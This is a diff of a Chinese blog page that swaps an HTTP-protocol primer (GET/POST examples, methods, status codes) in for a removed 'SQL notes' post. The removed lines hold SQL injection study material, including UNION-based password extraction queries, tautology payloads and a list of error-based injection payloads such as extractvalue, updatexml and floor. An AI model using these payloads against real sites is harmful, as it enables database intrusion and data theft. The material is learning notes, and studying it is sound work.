@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL 笔记, Niko blog">
+    <meta name="keywords" content="HTTP协议笔记, Niko blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL 笔记 | Niko blog</title>
+    <title>HTTP协议笔记 | Niko blog</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -261,12 +261,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL 笔记</h1>
+                    <h1 class="description center-align post-title">HTTP协议笔记</h1>
                 </div>
             </div>
         </div>
@@ -382,8 +382,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/SQL/">
-                                <span class="chip bg-color">SQL</span>
+                            <a href="/tags/HTTP%E5%8D%8F%E8%AE%AE/">
+                                <span class="chip bg-color">HTTP协议</span>
                             </a>
                         
                     </div>
@@ -394,8 +394,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/SQL/" class="post-category">
-                                SQL
+                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="post-category">
+                                计算机基础
                             </a>
                         
                     </div>
@@ -414,21 +414,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-30
+                    2021-10-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    771
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    5 分
                 </div>
                 
 
@@ -451,146 +451,77 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h5 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h5><p>可以去网站查看 <a target="_blank" rel="noopener" href="https://owasp.org/Top10/">OWASP 前 10：2021</a></p>
-<h4 id="SQL常用函数"><a href="#SQL常用函数" class="headerlink" title="SQL常用函数"></a>SQL常用函数</h4><table>
-<thead>
-<tr>
-<th align="center">函数名称</th>
-<th align="center">函数说明及使用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">MID（要截取的字符串，起始位置，结束位置）</td>
-<td align="center">截取字符串</td>
-</tr>
-<tr>
-<td align="center">CHAR(ASCII)</td>
-<td align="center">返回ASCII码对应的字符</td>
-</tr>
-<tr>
-<td align="center">ASCII(字符)</td>
-<td align="center">返回字符对应的ASCII码</td>
-</tr>
-<tr>
-<td align="center">IF(逻辑表达式,返回1，2)</td>
-<td align="center">if</td>
-</tr>
-<tr>
-<td align="center">SUBSTR（同MID）</td>
-<td align="center">同MID</td>
-</tr>
-<tr>
-<td align="center">LENGTH（字符串）</td>
-<td align="center">返回字符串长度</td>
-</tr>
-<tr>
-<td align="center">COUT(列名)</td>
-<td align="center">返回当前列名下有效记录数</td>
-</tr>
-<tr>
-<td align="center">SLEEP(s)</td>
-<td align="center">沉睡XXX秒，数字类型，可自定义</td>
-</tr>
-<tr>
-<td align="center">#  /**/  –</td>
-<td align="center">–+</td>
-</tr>
-<tr>
-<td align="center">CONCAT(字符串1，字符串2…)</td>
-<td align="center">拼接字符</td>
-</tr>
-<tr>
-<td align="center">LOAD_FILE（文件名）</td>
-<td align="center">读取文件</td>
-</tr>
-<tr>
-<td align="center">INTO OUTFILE “文件名称”</td>
-<td align="center">输出</td>
-</tr>
-</tbody></table>
-<h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">-</span>u xxx <span class="token operator">-</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h2 id="什么是HTTP请求"><a href="#什么是HTTP请求" class="headerlink" title="什么是HTTP请求"></a>什么是HTTP请求</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">HTTP协议（Hyper Text Transfer Protocol，超文本传输协议）是用于从WWW服务器传输文本到本地浏览器的传输协议。
+它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，嗐确定传输文档中的哪一部分，
+以及那部分内容首先显示（如文本先于图像）等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="查看版本号"><a href="#查看版本号" class="headerlink" title="查看版本号"></a>查看版本号</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">-</span>h host <span class="token operator">-</span>u username <span class="token operator">-</span>p password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="常见的请求"><a href="#常见的请求" class="headerlink" title="常见的请求"></a>常见的请求</h3><h4 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h4><p>​        最常见的一种请求方式，当客户端要从服务器中读取文档时，当点击网页上的链接或者通过在浏览器的地址栏输入网址来浏览网页的，使用的都是GET方式。GET方法要求服务器将URL定位的资源放在响应报文的数据部分，回送给客户端。使用GET方法时，请求参数和对应的值附加在URL后面，利用一个问号（“?”）代表URL的结尾与请求参数的开始，传递参数长度受限制。例如，/index.jsp?id=100&amp;op=bind,这样通过GET方式传递的数据直接表示在地址中，所以我们可以把请求结果以链接的形式发送给好友。以用google搜索domety为例，Request格式如下：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/search?hl=zh-CN&amp;source=hp&amp;q=domety&amp;aq=f&amp;oq=</span> <span class="token http-version property">HTTP/1.1</span></span>    
+<span class="token header-name keyword">Accept:</span> image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint,   
+application/msword, application/x-silverlight, application/x-shockwave-flash, */*    
+<span class="token header-name keyword">Referer:</span> &lt;a href="http://www.google.cn/">http://www.google.cn/&lt;/a>    
+<span class="token header-name keyword">Accept-Language:</span> zh-cn    
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate    
+<span class="token header-name keyword">User-Agent:</span> Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld)    
+<span class="token header-name keyword">Host:</span> &lt;a href="http://www.google.cn">www.google.cn&lt;/a>    
+<span class="token header-name keyword">Connection:</span> Keep-Alive    
+<span class="token header-name keyword">Cookie:</span> PREF=ID=80a06da87be9ae3c:U=f7167333e2c3b714:NW=1:TM=1261551909:LM=1261551917:S=ybYcq2wpfefs4V9g;   
+NID=31=ojj8d-IygaEtSxLgaJmqSjVhCspkviJrB6omjamNrSm8lZhKy_yMfO2M4QMRKcH1g0iQv9u-2hfBW7bUFwVh7pGaRUb0RnHcJU37y-  
+FxlRugatx63JLv7CWMD6UB_O_r  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><h5 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h5><p>SQL注入分类：</p>
+<h4 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h4><p>​        对于上面提到的不适合使用GET方式的情况，可以考虑使用POST方式，因为使用POST方法可以允许客户端给服务器提供信息较多。POST方法将请求参数封装在HTTP请求数据中，以名称/值的形式出现，可以传输大量数据，这样POST方式对传送的数据大小没有限制，而且也不会显示在URL中。还以上面的搜索domety为例，如果使用POST方式的话，格式如下：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/search</span> <span class="token http-version property">HTTP/1.1</span></span>    
+<span class="token header-name keyword">Accept:</span> image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint,   
+application/msword, application/x-silverlight, application/x-shockwave-flash, */*    
+<span class="token header-name keyword">Referer:</span> &lt;a href="http://www.google.cn/">http://www.google.cn/&lt;/a>    
+<span class="token header-name keyword">Accept-Language:</span> zh-cn    
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate    
+<span class="token header-name keyword">User-Agent:</span> Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld)    
+<span class="token header-name keyword">Host:</span> &lt;a href="http://www.google.cn">www.google.cn&lt;/a>    
+<span class="token header-name keyword">Connection:</span> Keep-Alive    
+<span class="token header-name keyword">Cookie:</span> PREF=ID=80a06da87be9ae3c:U=f7167333e2c3b714:NW=1:TM=1261551909:LM=1261551917:S=ybYcq2wpfefs4V9g;   
+NID=31=ojj8d-IygaEtSxLgaJmqSjVhCspkviJrB6omjamNrSm8lZhKy_yMfO2M4QMRKcH1g0iQv9u-2hfBW7bUFwVh7pGaRUb0RnHcJU37y-  
+FxlRugatx63JLv7CWMD6UB_O_r    
+  
+hl=zh-CN&amp;source=hp&amp;q=domety  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="GET请求和POST请求的区别"><a href="#GET请求和POST请求的区别" class="headerlink" title="GET请求和POST请求的区别"></a>GET请求和POST请求的区别</h5><h6 id="浏览器角度"><a href="#浏览器角度" class="headerlink" title="浏览器角度"></a>浏览器角度</h6><p>​        浏览器限制GET的长度，但是不限制提交的POST长度<br>​        POST的长度取决于服务器端的配置</p>
+<h6 id="数据接收方式"><a href="#数据接收方式" class="headerlink" title="数据接收方式"></a>数据接收方式</h6><p>​        GET是通过浏览器地址栏传递数据，POST是通过浏览器隐式提交数据(刷新页面)</p>
+<h6 id="用途角度"><a href="#用途角度" class="headerlink" title="用途角度"></a>用途角度</h6><p>​        发送登录请求均使用POST<br>​        提交发送搜索请求均使用GET提交</p>
+<h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p>​        PUT 向网页写入文件</p>
+<h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>​        COPY 复制文件</p>
+<h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>​        DELETE 删除</p>
+<h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>​        OPTIONS 返回请求方式</p>
+<h4 id="解析GET请求"><a href="#解析GET请求" class="headerlink" title="解析GET请求"></a>解析GET请求</h4><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">GET/HTTP/1.1 -- 请求方式
+Host：stentqh.geithub.io -- 请求地址
+User-Agent:Mozilla/5.0(windows NT 10.0 WOW64; rv:51.0)
+# 请求的设备（返回电脑页面或者手机页面）
+Accept:xml/html text -- 页面上传
+Accept-Language：zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 
+# 语言 中文、英文
+Accept-Encoding: gzip,deflate -- 传输压缩
+Cookie:code=bd60dd1ee8009d95677xxxx; -- Cookie
+Connection:keep-alive -- Cookie存活多久<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="常见的HTTP状态码"><a href="#常见的HTTP状态码" class="headerlink" title="常见的HTTP状态码"></a>常见的HTTP状态码</h2><p>​        当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含HTTP状态码的信息头（server header）用以响应浏览器的请求。<br>HTTP状态码的英文为HTTP Status Code。状态代码由三位数字组成，第一个数字定义了响应的类别，且有五种可能取值。</p>
 <ul>
-<li>回显正常—&gt; 联合查询 union select</li>
-<li>回显报错—&gt; Duplicate entry()<pre><code>       extractvalue()
-</code></pre>
-  　　       updatexml()</li>
-<li>盲注    —&gt;布尔型盲注<pre><code>       基于时间的盲注sleep()
-</code></pre>
-</li>
+<li>1xx：指示信息–表示请求已接收，继续处理。</li>
+<li>2xx：成功–表示请求已被成功接收、理解、接受。</li>
+<li>3xx：重定向–要完成请求必须进行更进一步的操作。</li>
+<li>4xx：客户端错误–请求有语法错误或请求无法实现。</li>
+<li>5xx：服务器端错误–服务器未能实现合法的请求。</li>
 </ul>
-<h5 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token keyword">status</span><span class="token punctuation">;</span> <span class="token comment">/*(order by x)*/</span><span class="token comment">--列</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">/*0,password,0*/</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>xxx<span class="token punctuation">;</span><span class="token comment">/*跨库 要root*/</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">or</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token keyword">select</span> xxxx <span class="token keyword">from</span> xxxx<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span>
-<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token comment">/*表名*/</span> <span class="token keyword">from</span> <span class="token comment">/*库名*/</span><span class="token keyword">tables</span>
-<span class="token comment">/* 
-   例子 
-       select table_schema from information_schema.tables
-      
-       union select1,2,3,select table_name from nformation_schema.tables where table_schema='jokerDB'
-       解析：从information_scheam数据库的table_schema列名获取jokerDB 在进行约束 
-	   union select1,2,3,select table_name from nformation_schema.tables where table_schema='jokerDB' and tabke_name='uers'
-       查询你认为可能像密码的表
-*/</span>
-<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> xxx<span class="token punctuation">;</span><span class="token comment">/*字符填充 防止报错*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查看版本</span>
-<span class="token keyword">set</span> xxxx gdk <span class="token comment">//编码 首先的知道编码</span>
-<span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span> <span class="token comment">//查看数据库</span>
-<span class="token keyword">create</span> datase test<span class="token punctuation">;</span> <span class="token comment">//新建数据库test</span>
-<span class="token keyword">use</span> test<span class="token punctuation">;</span> <span class="token comment">//使用数据库</span>
-<span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span> <span class="token comment">//查看表</span>
-<span class="token comment">// 创建表</span>
-<span class="token keyword">create</span> <span class="token keyword">table</span> xxxx<span class="token punctuation">(</span>id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span> username <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>password <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token keyword">primary</span> ker<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//查看字段类型</span>
-<span class="token keyword">show</span> <span class="token keyword">full</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> xxxx<span class="token punctuation">;</span>
-<span class="token comment">//插入数据</span>
-<span class="token keyword">insert</span> <span class="token keyword">into</span> xxxx<span class="token punctuation">(</span>username<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">,</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>
-<span class="token comment">//查看数据</span>
-<span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> xxxx<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><h5 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//常规注入 </span>
-php? id<span class="token operator">=</span><span class="token number">1</span>
-php? id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
-?id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">or</span> <span class="token string">'s'</span><span class="token operator">=</span><span class="token string">'s'</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//联合注入</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx<span class="token punctuation">;</span>
-
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> xxxx <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
-
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> xxxx 列名<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
-
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">exists</span><span class="token punctuation">(</span>xxxx username <span class="token keyword">from</span> admin<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h5 id="常用十大报错函数"><a href="#常用十大报错函数" class="headerlink" title="常用十大报错函数"></a>常用十大报错函数</h5><h6 id="1-floor"><a href="#1-floor" class="headerlink" title="1. floor()"></a>1. floor()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sel <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2. extractvalue()"></a>2. extractvalue()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3. updatexml()"></a>3. updatexml()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="4-geometrycollection"><a href="#4-geometrycollection" class="headerlink" title="4.geometrycollection()"></a>4.geometrycollection()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">geometrycollection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="5-multipoint"><a href="#5-multipoint" class="headerlink" title="5. multipoint()"></a>5. multipoint()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipoint</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="6-polygon"><a href="#6-polygon" class="headerlink" title="6. polygon()"></a>6. polygon()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="7-multipolygon"><a href="#7-multipolygon" class="headerlink" title="7.multipolygon()"></a>7.multipolygon()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipolygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="8-linestring"><a href="#8-linestring" class="headerlink" title="8.linestring()"></a>8.linestring()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">linestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="9-multilinestring"><a href="#9-multilinestring" class="headerlink" title="9.multilinestring()"></a>9.multilinestring()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multilinestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span 